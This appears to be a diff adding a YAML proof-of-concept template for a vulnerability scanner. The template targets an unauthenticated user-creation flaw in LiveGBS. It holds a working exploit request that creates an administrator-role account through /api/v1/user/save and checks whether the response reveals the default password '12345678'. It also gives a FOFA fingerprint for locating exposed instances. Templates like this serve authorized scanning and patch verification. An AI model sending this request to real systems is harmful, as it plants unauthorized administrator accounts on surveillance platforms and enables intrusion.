@@ -1,0 +1,17 @@
+id: poc-yaml-livegbs-user-save-created-by-any-user
+info:
+  name: LiveGBS user-save 任意用户创建漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: livegbs
+  fofa: icon_hash="-206100324"
+variables:
+  t1: random_str(6)
+requests:
+- method: GET
+  path: /api/v1/user/save?ID=&Username={{.t1}}&Role=%E7%AE%A1%E7%90%86%E5%91%98&Enable=true
+  expression: "status_code == 200 && \ncontains(body,\"\\\"DefaultUserPassword\\\"\
+    : \\\"12345678\\\"\") &&\ncontains(body,\"\\\"ID\\\"\") &&\ncontains(content_type,\"\
+    application/json\")\n"
+transport: http
